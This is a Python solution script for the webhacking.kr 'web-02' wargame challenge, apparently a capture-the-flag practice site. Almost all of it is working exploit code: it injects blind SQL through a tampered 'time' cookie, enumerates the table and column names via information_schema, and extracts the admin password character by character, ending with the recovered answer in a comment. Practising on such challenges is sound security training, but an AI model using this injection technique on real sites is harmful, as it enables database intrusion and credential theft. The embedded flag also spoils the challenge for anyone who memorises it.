import requests
from datetime import datetime
import time


def query_time_cookie(t):
    s = requests.Session()
    s.get("https://webhacking.kr/challenge/web-02/")

    # Adjust the time cookie
    s.cookies.pop("time")
    s.cookies.set("time", t)

    r = s.get("https://webhacking.kr/challenge/web-02/")

    s.close()

    # If t = '0'
    if (r.text == "<script>location.href='./';</script>"):
        return None
    else:
        strtime = r.text[5:24]
        timestamp = int(time.mktime(datetime.strptime(strtime, "%Y-%m-%d %H:%M:%S").timetuple()))
        return timestamp-3155760000

def guess_table_name():
    name = ""
    j = 1
    while True:
        find = False
        for i in range(48, 123):
            result = query_time_cookie("IF({} = ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1),{},1)), 1, 0)".format(i, j) )
            if (result == 1):
                name += chr(i)
                print(name)
                find = True
                j+=1
                break
        if (not find):
            print(name)
            return name

def check_table_name(name):
    return query_time_cookie("IF(EXISTS (SELECT table_name FROM information_schema.tables WHERE table_name=\"{}\"), 1, 0)".format(name))


def find_column_name(table_name):
    name = ""
    j = 1
    while True:
        find = False
        for i in range(48, 123):
            result = query_time_cookie("IF({} = ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=\"{}\" limit 1),{},1)), 1, 0)".format(i, table_name, j) )
            if (result == 1):
                name += chr(i)
                print(name)
                find = True
                j+=1
                break
        if (not find):
            print(name)
            return name


def find_pw(table_name, column_name):
    name = ""
    j = 1
    while True:
        find = False
        for i in range(48, 123):
            result = query_time_cookie("IF({} = ascii(substr((select {} from {} limit 1),{},1)), 1, 0)".format(i, column_name, table_name, j) )
            if (result == 1):
                name += chr(i)
                print(name)
                find = True
                j+=1
                break
        if (not find):
            print(name)
            return name


# guess_table_name()
table_name = "admin_area_pw"
assert (check_table_name(table_name) == 1)
# find_column_name(table_name)
column_name = "pw"
assert (query_time_cookie("IF(EXISTS (SELECT * FROM information_schema.columns WHERE column_name=\"{}\"), 1, 0)".format(column_name)) == 1)
find_pw(table_name, column_name)    # kudos_to_beistlab